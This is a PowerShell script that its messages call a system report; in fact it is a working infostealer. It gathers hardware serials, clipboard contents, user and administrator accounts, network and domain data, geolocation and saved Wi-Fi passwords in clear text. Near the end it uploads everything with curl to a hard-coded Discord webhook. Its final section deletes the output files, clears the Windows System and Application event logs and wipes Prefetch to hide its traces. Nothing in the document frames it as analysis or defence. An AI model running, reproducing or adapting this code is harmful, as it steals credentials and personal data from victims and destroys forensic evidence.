$OutFile = "$env:USERPROFILE\Documents\personal_info.txt"
$OutFileClip = "$env:USERPROFILE\Documents\clipboard.txt"
$OutFilePC = "$env:USERPROFILE\Documents\pc_info.txt"

"==== CPU Information ====" | Out-File -Append $OutFilePC
Get-CimInstance Win32_Processor | Select-Object Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed, Architecture | Out-File -Append $OutFilePC

"==== RAM Information ====" | Out-File -Append $OutFilePC
Get-WmiObject Win32_PhysicalMemory | Select-Object BankLabel, Capacity, Manufacturer, PartNumber, Speed, SerialNumber | Out-File -Append $OutFilePC
Get-WmiObject -Class Win32_PhysicalMemoryArray | Select-Object MemoryDevices | Out-File -Append $OutFilePC

"==== Disk Drives and SMART Status ====" | Out-File -Append $OutFilePC
Get-WmiObject Win32_DiskDrive | Select-Object Model, InterfaceType, MediaType, Size, SerialNumber, Status | Out-File -Append $OutFilePC
try { Get-Disk | Get-StorageReliabilityCounter -ErrorAction SilentlyContinue | Out-File -Append $OutFilePC }catch {}

"==== GPU Information ====" | Out-File -Append $OutFilePC
Get-WmiObject Win32_VideoController | Select-Object Name, AdapterRAM, DriverVersion, VideoProcessor | Out-File -Append $OutFilePC

"==== Motherboard & BIOS Information ====" | Out-File -Append $OutFilePC
Get-WmiObject Win32_BaseBoard | Select-Object Manufacturer, Product, SerialNumber, Version | Out-File -Append $OutFilePC
Get-WmiObject Win32_BIOS | Select-Object SMBIOSBIOSVersion, Manufacturer, SerialNumber, ReleaseDate | Out-File -Append $OutFilePC

"==== Clipboard Contents ====" | Out-File -Append $OutFileClip
try {
    Add-Type -AssemblyName PresentationCore; 
    ([Windows.Clipboard]::GetText()) | Out-File -Append $OutFileClip;
}
catch {}

"==== Network Adapters (All) ====" | Out-File -Append $OutFilePC
Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, MacAddress, LinkSpeed | Out-File -Append $OutFilePC

"==== Ethernet Link Speeds ====" | Out-File -Append $OutFilePC
Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Select-Object Name, LinkSpeed | Out-File -Append $OutFilePC

"==== DHCP Lease Info (if DHCP role is present) ====" | Out-File -Append $OutFilePC
try { Get-DhcpServerv4Lease | Out-File -Append $OutFilePC } catch { "No local DHCP server or permissions issue `n" | Out-File -Append $OutFilePC }

"==== User Profiles and Groups ====" | Out-File -Append $OutFilePC
Get-WmiObject Win32_UserAccount | Where-Object {$_.LocalAccount -eq $true} | Out-File -Append $OutFilePC

"==== List of Administrators ====" | Out-File -Append $OutFilePC
Get-LocalGroupMember -Group "Administrators" | Select-Object Name, PrincipalSource, SID | Out-File -Append $OutFilePC

"==== Last Logon Times for Local Profiles ====" | Out-File -Append $OutFilePC
Get-WmiObject Win32_NetworkLoginProfile | Select-Object Name, 
@{Name="LastLogon";Expression={ 
    if ($_.LastLogon) { 
        [System.Management.ManagementDateTimeConverter]::ToDateTime($_.LastLogon) 
    } else { 
        $null 
    } 
}},
@{Name="PasswordAge";Expression={ 
    if ($_.PasswordAge) { 
        $ticks = [int64]$_.PasswordAge.Split('.')[0]
        (New-TimeSpan -Ticks $ticks)
    } else { 
        $null 
    }
}},
@{Name="PasswordExpires";Expression={
    if ($_.PasswordExpires) {
        [System.Management.ManagementDateTimeConverter]::ToDateTime($_.PasswordExpires)
    } else {
        $null
    }
}}, CountryCode, Privileges | Out-File -Append $OutFilePC

"==== Running Processes ====" | Out-File -Append $OutFilePC
Get-Process | Select-Object Name, Id, Path | Out-File -Append $OutFilePC

"==== Startup Programs ====" | Out-File -Append $OutFilePC
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, User | Out-File -Append $OutFilePC

"==== Recent System Errors/Warnings ====" | Out-File -Append $OutFilePC
Get-EventLog -LogName System -EntryType Error, Warning -Newest 50 |
    ForEach-Object { "[$($_.EntryType)] $($_.TimeGenerated) $($_.Source): $($_.Message)" } | Out-File -Append $OutFilePC

"==== Windows Updates Status ====" | Out-File -Append $OutFilePC
Get-HotFix | Out-File -Append $OutFilePC

"==== Battery Information (if present) ====" | Out-File -Append $OutFilePC
try{Get-WmiObject Win32_Battery | Out-File -Append $OutFilePC}catch{Write-Output "$_" | Out-File -Append $OutFilePC}

"==== Audio Devices ====" | Out-File -Append $OutFilePC
Get-WmiObject Win32_SoundDevice | Out-File -Append $OutFilePC

"==== Printers ====" | Out-File -Append $OutFilePC
Get-WmiObject Win32_Printer | Out-File -Append $OutFilePC

"==== OS Licensing ====" | Out-File -Append $OutFilePC
Get-WmiObject SoftwareLicensingProduct | Where-Object { $_.PartialProductKey } | Select-Object Name, LicenseStatus | Out-File -Append $OutFilePC

"==== Firewall Status ====" | Out-File -Append $OutFilePC
Get-NetFirewallProfile | Select-Object Name, Enabled | Out-File -Append $OutFilePC

"==== Connected USB Devices (past/present) ====" | Out-File -Append $OutFilePC
Get-WmiObject Win32_USBControllerDevice | ForEach-Object{
    try {
        $dev = [WMI]$_.Dependent
        "DeviceID: $($dev.DeviceID), Description: $($dev.Description), Manufacturer: $($dev.Manufacturer)"
    } catch {}
} | Out-File -Append $OutFilePC

"==== Detailed USB Device History ====" | Out-File -Append $OutFilePC
$usbStorRoot = "HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR"
if (Test-Path $usbStorRoot) {
    Get-ChildItem -Path $usbStorRoot | ForEach-Object {
        $deviceKey = $_.PSChildName
        $devicePath = Join-Path $usbStorRoot $deviceKey
        Get-ChildItem -Path $devicePath | ForEach-Object {
            $instance = $_.PSChildName
            $instancePath = Join-Path $devicePath $instance
            $props = Get-ItemProperty -Path $instancePath
            $output = @()
            $output += "Device: $deviceKey    Instance: $instance"
            $output += "FriendlyName   : $($props.FriendlyName)"
            $output += "Manufacturer   : $($props.Manufacturer)"
            $output += "SerialNumber   : $($instance)"
            $output += "Class          : $($props.Class)"
            $output += "DeviceDesc     : $($props.DeviceDesc)"
            $output += "VID/PID        : $(($deviceKey -split '&')[1,2] -join ', ')"
            # FirstInstallDate and LastArrivalDate if present
            if ($props.InstallDate)        { $output += "InstallDate    : $($props.InstallDate)" }
            if ($props.LastArrivalDate)    { $output += "LastArrivalDate: $($props.LastArrivalDate)" }

            $output | Out-File -Append $OutFile
            "" | Out-File -Append $OutFile
        }
    }
}

# Get drive letters and volume basic info for all USB disk drives
Get-WmiObject Win32_DiskDrive | Where-Object { $_.InterfaceType -eq 'USB' } | ForEach-Object {
    $output = @()
    $output += "DeviceID      : $($_.DeviceID)"
    $output += "PNPDeviceID   : $($_.PNPDeviceID)"
    $output += "SerialNumber  : $($_.SerialNumber)"
    $output += "Description   : $($_.Model)"
    $output += "Manufacturer  : $($_.Manufacturer)"
    # VID & PID
    $vidpid = ($_.PNPDeviceID -split '\\')[1]
    $output += "VID/PID       : $vidpid"
    # Find partitions/volumes, get drive letter / label / FS
    $partitions = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskDrive.DeviceID='$($_.DeviceID)'} WHERE AssocClass=Win32_DiskDriveToDiskPartition"
    foreach ($partition in $partitions) {
        $logical = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskPartition.DeviceID='$($partition.DeviceID)'} WHERE AssocClass=Win32_LogicalDiskToPartition"
        foreach ($l in $logical) {
            $output += "DriveLetter    : $($l.DeviceID)"
            $output += "VolumeLabel    : $($l.VolumeName)"
            $output += "FileSystem     : $($l.FileSystem)"
        }
    }
    $output | Out-File -Append $OutFilePC
    "" | Out-File -Append $OutFilePC
}

# display all USB registry keys for deep forensics
$usbRoot = "HKLM:\SYSTEM\CurrentControlSet\Enum\USB"
if (Test-Path $usbRoot) {
    "==== Raw USB Registry Entries ====" | Out-File -Append $OutFilePC
    Get-ChildItem -Path $usbRoot | ForEach-Object {
        "Key: $($_.Name)" | Out-File -Append $OutFilePC
    }
}

# User context for USB insertion is not directly available, but recent arrivals/install may show currently active user in Windows event logs
"==== Recent USB Arrival Events (event logs) ====" | Out-File -Append $OutFilePC
Get-WinEvent -FilterHashtable @{LogName='System';ID=2003,2100,2102,2106,400,410,43} -MaxEvents 30 | ForEach-Object {
    "Time: $($_.TimeCreated), Message: $($_.Message)"
} | Out-File -Append $OutFilePC

# get installed software
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
Out-File -Append $OutFilePC

Get-NetAdapter | Select-Object Name, MacAddress | Out-File -Append $OutFile

Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" -and $_.InterfaceAlias -notlike "*Virtual*" } | Select-Object IPAddress | Out-File -Append $OutFile

Write-Output "Username: $env:USERNAME" | Out-File -Append $OutFile

$antiviruses = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
if ($antiviruses) {
    $antiviruses | ForEach-Object {
        "Name        : $($_.displayName)"
        "Product GUID: $($_.instanceGuid)"
        "State       : $($_.productState)"
        "Path        : $($_.pathToSignedProductExe)`n"
    } | Out-File -Append $OutFile
} else {
    "No antivirus products detected, or script must be run with Administrator privileges." | Out-File -Append $OutFile
}

function EnumNetwork {
    if ((Get-WmiObject Win32_ComputerSystem).PartOfDomain) {
        Get-ADUser -Filter * | Select-Object SamAccountName, DistinguishedName | Out-File -Append $OutFile
        Get-SmbShare | Select-Object Name, Path | Out-File -Append $OutFile
    }
    arp -a | Out-File -Append $OutFile
    "`n" | Out-File -Append $OutFile 
}
EnumNetwork

$PublicIP = (Invoke-RestMethod -Uri "https://api.ipify.org")
Write-Output "Public IP Address: $PublicIP `n" | Out-File -Append $OutFile

$geo = Invoke-RestMethod -Uri "http://ip-api.com/json/" -UseBasicParsing

$locationInfo = @"
Country:      $($geo.country)
CountryCode:  $($geo.countryCode)
Region:       $($geo.region)
RegionName:   $($geo.regionName)
City:         $($geo.city)
ZIP:          $($geo.zip)
Latitude:     $($geo.lat)
Longitude:    $($geo.lon)
Timezone:     $($geo.timezone)
ISP:          $($geo.isp)
Org:          $($geo.org)
AS:           $($geo.as)
Query IP:     $($geo.query)
`n
"@
$locationInfo | Out-File -Append $OutFile

"Wi-Fi SSIDs and Passwords:" | Out-File -Append $OutFile
$profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
    $_.ToString().Split(":")[1].Trim()
}
foreach ($name in $profiles) {
    $wifiInfo = netsh wlan show profile name="$name" key=clear
    $passwordLine = $wifiInfo | Select-String "Key Content"
    if ($passwordLine) {
        $password = $passwordLine.ToString().Split(":")[1].Trim()
    } else {
        $password = "[NO PASSWORD SAVED]"
    }
    "$name : $password" | Out-File -Append $OutFile
}

$lat = $geo.lat
$lon = $geo.lon
$MapsUrl = "https://www.google.com/maps/search/?api=1&query=$lat,$lon"

$HtmlContent = @"
<html>
<head>
    <title>Google Maps Location</title>
</head>
<body>
    <h2>Device Location on Google Maps</h2>
    <p>Country: $($geo.country)<br>
    Region: $($geo.regionName)<br>
    City: $($geo.city)<br>
    ZIP: $($geo.zip)<br>
    Latitude: $lat<br>
    Longitude: $lon<br></p>
    <p><a href='$MapsUrl' target='_blank'>Open Google Maps</a></p>
</body>
</html>
"@
$HtmlPath = "$env:USERPROFILE\Documents\DeviceLocation.html"
$HtmlContent | Out-File -Encoding utf8 $HtmlPath

Write-Output "System report created as System_Report.txt"
Write-Output "Google Maps location HTML created as DeviceLocation.html"

function AntiForensics {
    try {
        $null = [Diagnostics.Process]::Start("svchost.exe", "")  # Spoof as svchost
        wevtutil cl System
        wevtutil cl Application
        Remove-Item "$env:SYSTEMROOT\Prefetch\*" -Force -ErrorAction SilentlyContinue
    }
    catch {}
}

$webhookuri = "https://discord.com/api/webhooks/1334995176321581166/3RoYJez5stb8LCsQx_4znANOdHR87FODSlI5kEXVYIwCgwT7-Cx9C-IertebeqnNC5kH"

curl.exe -F "file1=@$OutFile" -F "file2=@$OutFileClip" -F "file3=@$OutFilePC" -F "file4=@$HtmlPath" $webhookuri

@($OutFile, $OutFileClip, $OutFilePC, $HtmlPath) | ForEach-Object { Remove-Item -Path $_ -Force }

AntiForensics
